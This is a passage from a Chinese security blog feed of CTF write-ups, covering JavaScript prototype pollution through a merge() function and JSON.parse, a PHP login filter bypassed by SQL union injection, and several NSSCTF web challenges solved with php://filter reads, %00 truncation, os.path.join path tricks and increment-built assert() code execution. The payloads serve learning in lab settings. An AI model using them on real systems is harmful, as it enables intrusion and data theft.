class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function student(name, ID)</span><br><span class="line">&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.ID = ID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">student.prototype = new Array();</span><br><span class="line"></span><br><span class="line">var studentgroup = new student();</span><br><span class="line">studentgroup.push(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;)</span><br><span class="line">console.log(studentgroup.length)</span><br><span class="line">console.log(studentgroup instanceof Array)</span><br><span class="line">console.log(Object.getPrototypeOf(Object.prototype))</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_4.png"></p><h4 id="2-constructor属性"><a href="#2-constructor属性" class="headerlink" title="2.constructor属性"></a>2.constructor属性</h4><p>prototype对象都有一个constructor属性，指向所在的构造函数。</p><ol><li>这个属性可以知道某个实例对象是由哪个构造函数生成的，从而能够通过实例对象新建另一个实例。</li><li>constructor属性表示的是原型对象和构造函数的关系，如果修改原型函数的指向时，需要一起修改constructor属性，防止引用出错。所以一般不直接修改原型函数指向，采用添加方法的形式操作。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function student(name, ID)</span><br><span class="line">&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.ID = ID;</span><br><span class="line">&#125;</span><br><span class="line">console.log(student.prototype.constructor)</span><br><span class="line"></span><br><span class="line">var cyt = new student();</span><br><span class="line">console.log(cyt.constructor);</span><br><span class="line">console.log(cyt.hasOwnProperty(&quot;constructor&quot;));//实例对象没有这个属性，是继承于原型链</span><br><span class="line"></span><br><span class="line">var zpc = new cyt.constructor();</span><br><span class="line">console.log(zpc.constructor)</span><br><span class="line"></span><br><span class="line">student.prototype = new Array();</span><br><span class="line">console.log(student.prototype.constructor)</span><br><span class="line">student.prototype = &#123;</span><br><span class="line">  method: function()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(student.prototype.constructor)</span><br><span class="line">student.prototype.constructor = student;</span><br><span class="line">console.log(student.prototype.constructor)</span><br><span class="line"></span><br><span class="line">console.log(cyt.constructor.name)//输出构造函数名</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_5.png"></p><h4 id="3-ptorotype和-proto"><a href="#3-ptorotype和-proto" class="headerlink" title="3.ptorotype和__proto__"></a>3.ptorotype和__proto__</h4><p>对于构造函数而言，访问原型对象是通过prototype属性，但是对于构造函数创建的实例对象而言不是这么做的，而是通过__proto__属性。</p><table><thead><tr><th><strong>特性</strong></th><th><strong>prototype (显式原型)</strong></th><th><strong><strong>proto</strong> (隐式原型)</strong></th></tr></thead><tbody><tr><td><strong>谁拥有它？</strong></td><td><strong>函数</strong> (构造函数&#x2F;类)</td><td><strong>对象</strong> (实例)</td></tr><tr><td><strong>它的作用</strong></td><td>存放公共的方法和属性（相当于“公共库”）。</td><td>一个指针，指向构造函数的 <code>prototype</code>，帮对象找到它的“根”。</td></tr><tr><td><strong>形象比喻</strong></td><td><strong>工厂的模具&#x2F;设计图纸</strong></td><td>产品身上贴的标签：<strong>“产自该模具”</strong></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function student(name, ID)</span><br><span class="line">&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.ID = ID;</span><br><span class="line">&#125;</span><br><span class="line">console.log(typeof student.prototype)</span><br><span class="line">var cyt = new student();</span><br><span class="line">console.log(typeof cyt.prototype)</span><br><span class="line">console.log(typeof cyt.__proto__)</span><br><span class="line">console.log(typeof cyt.__proto__.__proto__.__proto__.__proto__)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_6.png"></p><p>其实cyt.__proto__.__proto__.__proto__的值为null，因为历史原因（类型标签的定义），类型为Object，此时访问cyt.__proto__.__proto__.__proto__.__proto__也就是null.__proto__就会报错。</p><h2 id="四、原型链污染"><a href="#四、原型链污染" class="headerlink" title="四、原型链污染"></a>四、原型链污染</h2><p>原型链污染故名思及就是通过实例进行对其构造函数的原型对象的属性进行修改，从而污染后续构造函数新建的每一个实例。前提是这个实例没有自定义这个属性，即可实现覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let father = &#123;name: &quot;father&quot;, age: 45&#125;;</span><br><span class="line">console.log(father.name)</span><br><span class="line">father.__proto__.name = &quot;son&quot;;</span><br><span class="line">let son = &#123;&#125;</span><br><span class="line">console.log(son.name)</span><br><span class="line">console.log(father.name)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_7.png"></p><p>可以看到已经实现了污染，新建的对象son的name值为son，而father对象因为自定义了这个属性所以没有被污染。</p><p>哪些情况会出现原型链污染呢？要找能控制对象的<strong>键名</strong>的操作，像merge()、clone()等危险函数</p><p>要注意：JavaScript 引擎对于对象字面量 和JSON.parse处理 __proto__ 键的方式完全不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;//对象字面量</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br><span class="line">console.log(o1.__proto__)</span><br><span class="line">console.log(o2.__proto__)</span><br><span class="line">console.log(o3.__proto__)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_8.png"></p><p>这里可以看到，o1的b属性被修改，a属性也被修改，理论上来说我们应该实现了原型链污染，但是从输出信息来看，只有o2的原型对象被修改，o1和o3的原型链并未被污染，这又是何意味？</p><p>当使用对象字面量 let o2 &#x3D; {a: 1, “__proto__“: {b: 2}} 时，JavaScript 引擎进行了特殊处理：</p><ul><li><code>o2</code> 的自有属性是 <code>a: 1</code>。</li><li><code>o2</code> 的内部原型（<code>[[Prototype]]</code>）被设置为 <code>&#123;b: 2&#125;</code>。</li></ul><p>for…in 的行为： </p><ol><li>循环首先找到 <code>o2</code> 的自有属性 <code>&quot;a&quot;</code>，将其复制到 <code>o1</code>。</li><li>循环接着向上查找 <code>o2</code> 的原型链。它在 <code>o2</code> 的原型对象 <code>&#123;b: 2&#125;</code> 上找到了属性 <code>&quot;b&quot;</code>。</li><li><code>merge</code> 函数执行 <code>target[key] = source[key]</code>，即 <code>o1[&quot;b&quot;] = o2[&quot;b&quot;]</code>。<ul><li><code>o2[&quot;b&quot;]</code> 通过原型查找得到了值 <code>2</code>。</li><li>这个值 <code>2</code> 被赋值给了 <code>o1</code>，作为 <code>o1</code> 的<strong>自有属性</strong>。</li></ul></li></ol><p>原型链污染的发生，必须满足一个核心条件：攻击者成功地修改了所有对象共享的<strong>Object.prototype</strong>。</p><ol><li><code>o2</code> 是用对象字面量创建的，<code>&quot;__proto__&quot;</code> 没有成为 <code>o2</code> 的自有属性，因此 <code>for...in</code> 循环根本没有遍历到 <code>&quot;__proto__&quot;</code> 这个键。</li><li><code>merge</code> 函数没有机会执行类似 <code>o1[&quot;__proto__&quot;] = ...</code> 的赋值操作。</li><li>因此，全局的 <code>Object.prototype</code> 保持干净，没有被添加 <code>b</code> 属性。</li></ol><p>那应该怎么操作呢？重点就是需要让__proto__被认为是一个键名，需要用到JSON解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)//JSON解析</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br><span class="line">console.log(o1.__proto__)</span><br><span class="line">console.log(o2.__proto__)</span><br><span class="line">console.log(o3.__proto__)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_9.png"></p><p>此时原型链真正被污染了，为什么用JSON解析就可以呢？</p><p>JSON 是一种数据交换格式，它不包含 JavaScript 的复杂逻辑（如原型链、函数等）。在 JSON 标准中，<code>&quot;__proto__&quot;</code> 没有任何特殊含义，它就是一个普通的字符串，就像 <code>&quot;name&quot;</code> 或 <code>&quot;age&quot;</code> 一样。</p><ul><li><code>JSON.parse</code> 解析字符串并创建一个对象。它将 <code>&quot;__proto__&quot;</code> 视为一个普通的自有属性。</li><li><code>o2</code> 这个对象<strong>拥有</strong>一个名为 <code>&quot;__proto__&quot;</code> 的属性，其值是 <code>&#123;b: 2&#125;</code>。</li></ul><p>当你调用 <code>merge(o1, o2)</code> 时：</p><ol><li><p>遍历循环检测到了 <code>o2</code> 有一个名为 <code>&quot;__proto__&quot;</code> 的属性。</p></li><li><p><code>merge</code> 函数试图执行类似这样的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o1[&quot;__proto__&quot;][&quot;b&quot;] = o2[&quot;__proto__&quot;][&quot;b&quot;];</span><br></pre></td></tr></table></figure></li><li><p>在 JavaScript 中，访问 <code>o1[&quot;__proto__&quot;]</code> 实际上访问的是所有对象共享的 <code>Object.prototype</code>。</p></li><li><p>代码成功地在 <code>Object.prototype</code> 上添加了属性 <code>b</code></p></li><li><p>之后创建的任何对象都会通过原型链访问到这个 <code>b</code></p></li></ol><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP简单代码审计（1）</title>
      <link href="/2025/11/21/CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%881%EF%BC%89/"/>
      <url>/2025/11/21/CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="CTF复习-PHP代码简单审计"><a href="#CTF复习-PHP代码简单审计" class="headerlink" title="CTF复习-PHP代码简单审计"></a>CTF复习-PHP代码简单审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function is_trying_to_hak_me($str)</span><br><span class="line">&#123;   </span><br><span class="line">    $blacklist = [&quot;&#x27; &quot;, &quot; &#x27;&quot;, &#x27;&quot;&#x27;, &quot;`&quot;, &quot; `&quot;, &quot;` &quot;, &quot;&gt;&quot;, &quot;&lt;&quot;];</span><br><span class="line">    if (strpos($str, &quot;&#x27;&quot;) !== false) &#123;</span><br><span class="line">        if (!preg_match(&quot;/[0-9a-zA-Z]&#x27;[0-9a-zA-Z]/&quot;, $str)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($blacklist as $token) &#123;</span><br><span class="line">        if (strpos($str, $token) !== false) return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个函数顾名思义，进行输入检测，判断是否是黑客行为，要<strong>使函数返回false</strong>即可绕过这个输入检测。</p><p>定义了一个黑名单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = [&quot;&#x27; &quot;, &quot; &#x27;&quot;, &#x27;&quot;&#x27;, &quot;`&quot;, &quot; `&quot;, &quot;` &quot;, &quot;&gt;&quot;, &quot;&lt;&quot;]</span><br></pre></td></tr></table></figure><p>黑名单：单引号＋空格、空格+单引号、双引号、反引号、反引号+空格、空格+反引号、&lt;、&gt;</p><ol><li>过滤单引号和空格的组合，通常是为了防止类似**’ or ‘1’ &#x3D; ‘1’**这种类似的注入</li><li>双引号通常用于Sql语句闭合字符串</li><li>反引号一般用于包裹MySql表名或字段名，也可用于命令执行</li><li>两个尖括号通常用于php代码或者xss的payload</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($str, &quot;&#x27;&quot;) !== false) &#123;</span><br><span class="line">        if (!preg_match(&quot;/[0-9a-zA-Z]&#x27;[0-9a-zA-Z]/&quot;, $str)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>前面的过滤并非是把单引号直接打死，而是禁止单引号与空格的组合，在这串代码里面，就对单引号作了更严格的过滤</p><p><strong>preg_match</strong>函数会拿着前面的正则表达式在**$str**变量里面匹配，也就是说可以用单引号，但是单引号前后必须有数字或者字母</p><p>继续审计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$db = new SQLite3(&quot;/var/db.sqlite&quot;);</span><br><span class="line">$result = $db-&gt;query(&quot;SELECT * FROM users WHERE username=&#x27;$user&#x27;&quot;);</span><br><span class="line">if ($result === false) die(&quot;pls dont break me&quot;);</span><br><span class="line">else $result = $result-&gt;fetchArray();</span><br><span class="line">if ($result) &#123;</span><br><span class="line">    $split = explode(&#x27;$&#x27;, $result[&quot;password&quot;]);</span><br><span class="line">    $password_hash = $split[0];</span><br><span class="line">    $salt = $split[1];</span><br><span class="line">    if ($password_hash === hash(&quot;sha256&quot;, $pass.$salt)) $logged_in = true;</span><br><span class="line">    else $err = &quot;Wrong password&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else $err = &quot;No such user&quot;;</span><br></pre></td></tr></table></figure><p>实例化一个 SQLite3 对象，连接到服务器路径 <code>/var/db.sqlite</code> 的数据库文件</p><p>需要让输入的$user插入sql语句中能够正确返回</p><p>注意两个点：语句整体正确和注释符号正确</p><p>对于输入的result值里面提取到password，将’$’左边作为password的hash值，右边作为盐值</p><p>将password处输入的pass与盐值拼接进行sha256计算，如果等于输入的password_hash,则会通过验证</p><p>这里面就不能用#，需要用—或者–+</p><p>user传入admin’union select 1,’49d180ecf56132819571bf39d9b7b342522a2ac6d23c1418d3338251bfe469c8$7’–+</p><p>pass传入6</p><p>49d180ecf56132819571bf39d9b7b342522a2ac6d23c1418d3338251bfe469c8为67的sha256计算值，此时返回$logged_in为true</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound#28 Team</title>
      <link href="/2025/11/21/NSSCTF_28/"/>
      <url>/2025/11/21/NSSCTF_28/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h1><p>进来就是几个绕过执行文件包含到level2.php</p><p><img src="/img/NSSCTF_28/ez_php1.png"></p><p>传入POST变量a，b，GET变量password，检测password是不是数字，又检测它是不是123456，因为是弱类型，直接传password&#x3D;123456a即可。最后的file用伪协议即可</p><p>对于下面的有两种方法：</p><ul><li><p>数组绕过</p><p>a[]&#x3D;1&amp;b[]&#x3D;2</p><p><img src="/img/NSSCTF_28/ez_php2.png"></p></li><li><p>MD5碰撞</p><p><img src="/img/NSSCTF_28/ez_php3.png"></p><p>这里我是直接用yakit读我的文件，也可以用fastcoll生成后自己将文件里面的拿出来，方法在我的博客里面。</p></li></ul><p>这里进到第二层。其实这里有一个非预期，可以直接从这里读到根目录的flag</p><p><img src="/img/NSSCTF_28/ez_php4.png"></p><p>base64解码后得到flag。</p><p>预期解应该是进到level2.php里面，然后绕过waf执行rce。</p><p><img src="/img/NSSCTF_28/ez_php5.png"></p><p>这里过滤了大小写字母、^、<del>等符号，一般来说无字母数字RCE有三种方法，异或(^)，取反(</del>)，自增($)，这里用到自增</p><p>payload：</p><p><img src="/img/NSSCTF_28/ez_php6.png"></p><p>长度118，小于120，传入post变量的时候记得url编码</p><p><img src="/img/NSSCTF_28/ez_php7.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的自增</title>
      <link href="/2025/11/21/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/"/>
      <url>/2025/11/21/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h1><p>php是弱语言，单字符型变量自增能得到下一个字符，且单个或多个下划线_也可以作为变量名，自增操作可以通过使用++符号来完成</p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng1.png"></p><p>这里我们没给$_赋值，它会给自己赋值NULL&#x3D;0，这时输出的就是1</p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng2.png"></p><p>当我们获得A时，就可以通过自增获得所有大写字母</p><p>那我们怎么获得我们的第一个字母呢？</p><p>数组转字符串后是天然的字符串 Array，我们切片取第一个字符，就得到A</p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng3.png"></p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng4.png"></p><p>$++:此时是$<strong>，下一步的值才是$</strong>+1</p><p>++$_:此时是$__+1</p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng5.png"></p><p>这个自增还可以继续增加，如果超过26个了呢？</p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng6.png"></p><p>可以看到，A-Z之后就是AA-AZ，然后BA-BZ，至于有没有极限，我还没有深究</p><p>此时我们可以通过构造执行传参命令的payload</p><p><img src="/img/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/zizeng7.png"></p><p>assert($_POST[_])</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记录在NSSCTF刷题的过程，康复训练了属于是。。。</title>
      <link href="/2025/11/21/NSSCTF/"/>
      <url>/2025/11/21/NSSCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h2><p>首先看到有一个链接，下面有一个提示</p><p>You just view *.ctfhub.com</p><p>意思就是你只能访问的链接后缀得是.ctfhub.com</p><p>我们点进链接</p><p><img src="/img/NSSCTF/cve%E7%89%88%E7%AD%BE%E5%88%B0_1.png"></p><p>第一眼没有发现很明显的提示信息，但是我们看到url处有传参名url。</p><p>查看源代码和请求体信息</p><p><img src="/img/NSSCTF/cve%E7%89%88%E7%AD%BE%E5%88%B0_2.png"></p><p>发现hint，提示我们访问本地，联想到刚刚发现的url参数，意思就是让我们访问<a href="http://127.0.0.1/%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%88%E8%A6%81%E6%88%91%E4%BB%AC%E4%BB%A5.ctfhub.com%E7%BB%93%E5%B0%BE%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E6%83%B3%E5%88%B0%00%E6%88%AA%E6%96%AD%E3%80%82">http://127.0.0.1/，但是又要我们以.ctfhub.com结尾，这里可以想到%00截断。</a></p><p><strong>截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。</strong></p><p>可以构造payload：&#x2F;?url&#x3D;<a href="http://127.0.0.1%00.ctfhub.com">http://127.0.0.1%00.ctfhub.com</a></p><p><img src="/img/NSSCTF/cve%E7%89%88%E7%AD%BE%E5%88%B0_3.png"></p><p>tips告诉我们要以123结尾，把1改为123即可</p><p><img src="/img/NSSCTF/cve%E7%89%88%E7%AD%BE%E5%88%B0_4.png"></p><h2 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h2><p>打开网页，啥有用的信息也没找到，一般来说就是看网页，看源代码，请求体响应体，cookie等等信息，都找不到就扫，这题扫出来两个状态码为200的url</p><p><img src="/img/NSSCTF/easycon_1.png"></p><p><strong>这两个url走哪个后面做题流程都是一样的，我以第一个url做的，唯一的区别就是带login的图片显示不正常，不过不影响做题。</strong></p><p>加载网页后会有一个弹窗，显示eval post cmd</p><p><img src="/img/NSSCTF/easycon_2.png"></p><p>大致推测出是有eval危险函数可以执行任意命令，post传参，参数名是cmd</p><p>试一下，成了。可以执行</p><p><img src="/img/NSSCTF/easycon_3.png"></p><p>读取敏感文件</p><p><img src="/img/NSSCTF/easycon_4.png"></p><p>丢进赛博厨子</p><p><img src="/img/NSSCTF/easycon_5.png"></p><p>然后出flag</p><h2 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h2><p>打开网页，第一眼是文件上传，不过要长一个心眼，先从简单的情况入手，看源代码，请求体响应体，cookie等等信息。</p><p>这题在源代码发现了&#x2F;source路由，下载可以得到源码</p><p><img src="/img/NSSCTF/babyupload_1.png"></p><p>再就是代码审计，初始页面的文件上传。不能上传文件名有.的文件，即文件名不能有后缀</p><p><img src="/img/NSSCTF/babyupload_2.png"></p><p>如果有.就报错”Bad filename!”。如果正确，则保存到数据库，存的时候是uploads&#x2F;文件名，读取的时候是file&#x2F;uid。</p><p>利用&#x2F;file&#x2F;uid可以读取我们上传的文件，在这里用到了一个函数os.path.join，这个函数存在绝对路径拼接漏洞。</p><p><img src="/img/NSSCTF/babyupload_3.png"></p><p><strong>os.path.join函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。这个函数有一个特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</strong></p><p>在本题中，如果你后面传的文件名为&#x2F;flag，那拼接的时候会将前面的各级路径全部删掉，读取的就是根目录的flag文件。</p><p>所以我们可以做到以下操作：</p><p>打开burp，随便传一个文件，抓包拦截住，将文件名改成&#x2F;flag，然后发送。</p><p><img src="/img/NSSCTF/babyupload_4.png"></p><p>得到flag</p><p><img src="/img/NSSCTF/babyupload_5.png"></p><h2 id="MoeCTF-2022-baby-file"><a href="#MoeCTF-2022-baby-file" class="headerlink" title="[MoeCTF 2022]baby_file"></a>[MoeCTF 2022]baby_file</h2><p>打开网页是一串php代码，文件包含。</p><p>看到一句话，有秘密？看到在cookie处有一个flagisiin参数，对应的是&#x2F;f14g.php</p><p><img src="/img/NSSCTF/baby_file_1.png"></p><p>但是404，别的地方也没什么有用信息.</p><p><img src="/img/NSSCTF/baby_file_2.png"></p><p>扫描得到一个flag.php</p><p><img src="/img/NSSCTF/baby_file_3.png"></p><p>直接用&#x2F;?file&#x3D;flag.php会报错，这里用伪协议读取</p><p><strong>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p><p>得到文件内容</p><p><img src="/img/NSSCTF/baby_file_4.png"></p><p>丢进赛博厨子，得到flag</p><p><img src="/img/NSSCTF/baby_file_5.png"></p><h2 id="GDOUCTF-2023-受不了一点"><a href="#GDOUCTF-2023-受不了一点" class="headerlink" title="[GDOUCTF 2023]受不了一点"></a>[GDOUCTF 2023]受不了一点</h2><p>这题一打开看到挺多代码，但是其实只有三个地方我们需要绕过，因为第三层绕过就出flag</p><p>（NSSCTF平台上的是这样的，原题可能涉及变量覆盖的知识点，感兴趣的可以看看那个）</p><p><img src="/img/NSSCTF/%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9_1.png"></p><p>以下全部做题过程都是用的hackbar，安装教程参考<a href="">hackbar安装教程</a></p><p>第一层：</p><p><code>if($_POST[&#39;gdou&#39;]!=$_POST[&#39;ctf&#39;] &amp;&amp; md5($a)===md5($b))</code></p><p>只需要数组绕过即可；</p><p>第二层：</p><p><code>if(isset($_COOKIE[&#39;cookie&#39;]))&#123;       if ($_COOKIE[&#39;cookie&#39;]==&#39;j0k3r&#39;)&#123;</code></p><p>用hackbar改Cookie参数为cookie&#x3D;j0k3r即可；</p><p>第三层：</p><p><code>if(isset</code>($_GET[‘aaa’]) &amp;&amp; isset($_GET[‘bbb’])){<code>          </code>$aaa&#x3D;$_GET[‘aaa’];<br>         $bbb&#x3D;$_GET[‘bbb’];<code>          if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123;</code></p><p>弱比较，其中一个变量在数字后面加一个字母即可</p><p>payload如下：</p><p><img src="/img/NSSCTF/%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9_2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5碰撞-fastcoll使用</title>
      <link href="/2025/11/21/fastcoll%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/11/21/fastcoll%E4%BD%BF%E7%94%A8/</url>
      
